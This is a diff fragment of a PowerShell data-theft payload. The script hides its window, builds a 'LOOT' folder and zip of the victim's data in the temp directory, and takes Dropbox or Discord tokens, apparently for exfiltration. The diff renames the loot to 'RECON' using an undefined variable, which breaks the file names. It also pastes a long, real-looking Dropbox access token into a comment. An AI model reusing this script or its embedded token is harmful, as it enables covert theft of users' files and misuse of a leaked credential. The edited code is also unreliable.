@@ -39,11 +39,11 @@ add-type -name win -member $i -namespace native;
 
 # MAKE LOOT FOLDER, FILE, and ZIP 
 
-$FolderName = "$env:USERNAME-LOOT-$(get-date -f yyyy-MM-dd_hh-mm)"
+$FolderName = "$env:USERNAME-RECON-$(get-date -f yyyy-MM-dd_hh-mm)"
 
-$FileName = "$FolderName.txt"
+$FileName = "$RECON.txt"
 
-$ZIP = "$FolderName.zip"
+$ZIP = "$RECON.zip"
 
 New-Item -Path $env:tmp/$FolderName -ItemType Directory
 
@@ -51,7 +51,7 @@ New-Item -Path $env:tmp/$FolderName -ItemType Directory
 
 # Enter your access tokens below. At least one has to be provided but both can be used at the same time. 
 
-#$db = ""
+#$db = ""sl.u.AFjh6glz2YUoJcNCbYrO4sPC0eh-7FJT3PPEl96z2P3k8uMAenhshtscxfLE2MqGYxpohEZ-VDd38XDik807ghXvRsGTGtoC2gVUrzkEg4HxyPF-Pzosmy4zUSCcqJ2btE3qmebq1OUcKoxLkGZLnvRq86JDr-qtQ4y9iTTfL4bIngDNr1FqHN2I5fjqEg5GDX0bT3JeuVHwMhGPw3A2teIPCI2-_WRR6ulFc12kTJdwRfByKw7SbDXudAnYyyB3KoOD93_gIKDFShrBi2aDwfsa94Z5T3BGbpcZi1QZgvhxBA14om4DfBoLE1BK_qj5lFBysh1yuGWqvvj_mabfja42jdKxSDFaLMahPyibaNPdhB_1BhNYB9anAybMAlV9Rm12EBP_QO5eb6hMdp2aeSWPuerk0PvxE_HxJ8XcHlYdU88oWB3EUhLV-N5T-zcPVvp3yllId4lRPCAixYCuaSa1XGsVEZzQpQDy_cbZmyR_MsW-JcxIZVLsFcpHoozgvybtTsMu7WjMYcGzPj1beIcp7qoYlH9kpwymJD41GwhKtKUs0rmy72zhmeZmRSbv2zKBGNJNp-10DUkiSyz9n3GmzgXZe7dq7faVnVLqHuSmIWB7LwBkNfPX3HNT1fjbNFMaL7cyqO6mk1yiAfG7xuiqx5YOvqqV3-8qEQjPwgT8GMdE6MIdnbxig5kMFkYmwHM_s5i4Br5QteX2GUDWF-K-Af_ISzd_fF6BLEFtEnqXMgCOovjG36UukeX-_CpTDAOivEvfgh3GegIUjebcMuoOOShm3VLtBod0gm3Q75tAaTsabySCK62xoAizzCFti5FZ4atameXgwLLwiCAxjspBmvUcvWbfgFH0OX1tzRFysXJJZ_oyhK88as5Zu_4nS5-euOrO92cF1eY0Nydzb2wfpjIy1yZ-12VO7HucASn5x72lrRDtyblTQonhveFDfRC1gKIOy_vt2V09x7NieX-eMF1FvSYQF-iuUF9rthovkUd8DfJ9rk9Pclb-iXJbk9_5EVrbHRKmcd1rYQftUMDoH0c0kEIvZ7XSorsrTWpuWJYYgraUc86jEzHA34rLKUzJ3tntuA09WUnKqvXRoUba45mR-S7cs2PmU2SpeK12nGfW5qvEgTxG5-3mVCe39UkHR0cvxEe3fZDwURLRp_t-8Tt53xJRh5Jk0XRY1lW0-D9XsdSGPuRzqDrl9tJHhLI2Zl8PZj_wJIjJycOWPUTca0jIoYk6C0UqKeH12YAPawXeLbLt-2DnWiwkSuQbA_xzkRAVsuK8rx5OX_A2rX5kPrd08JG3EOuekR1IUlqYT7XKBt-0MDJpvLEgV6HL7lDNm0RqCFYfA4TwJX4lij9yHZtvzJ9ajGqSx6Zz2uV7bJVHJ4dSAbxqZSPzsgWr22V9VYBaugr2jHuVgGK5rR2e
 
 #$dc = ""
 
